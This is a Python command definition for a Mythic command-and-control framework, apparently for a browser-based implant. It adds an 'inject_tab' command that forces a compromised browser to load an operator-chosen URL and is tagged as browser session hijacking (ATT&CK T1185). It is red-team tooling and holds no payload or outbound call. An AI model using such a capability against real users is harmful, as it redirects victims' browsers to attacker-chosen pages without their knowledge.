from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments, CommandParameter, ParameterType,
    MythicTask, PTTaskMessageAllData,
    PTTaskProcessResponseMessageResponse, CommandAttributes,
)


class InjectTabArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="mode",
                type=ParameterType.ChooseOne,
                description="'current' to replace the active tab, 'new' to open a new tab",
                choices=["current", "new"],
                default_value="current",
            ),
            CommandParameter(
                name="url",
                type=ParameterType.String,
                description="Destination URL (must start with http:// or https://)",
            ),
        ]

    async def parse_arguments(self):
        if self.command_line.strip():
            self.load_args_from_json_string(self.command_line)


class InjectTabCommand(CommandBase):
    cmd            = "inject_tab"
    needs_admin    = False
    help_cmd       = "inject_tab"
    description    = (
        "Navigate an existing tab or open a new tab to a specified URL. "
        "Mode 'current' replaces the active tab; 'new' opens a new tab."
    )
    version        = 1
    author         = "@asaurusrex"
    argument_class = InjectTabArguments
    parameters     = []
    attackmapping  = ["T1185"]
    attributes     = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        mode = task.args.get_arg("mode")
        url  = task.args.get_arg("url")
        task.display_params = f"mode={mode} url={url}"
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
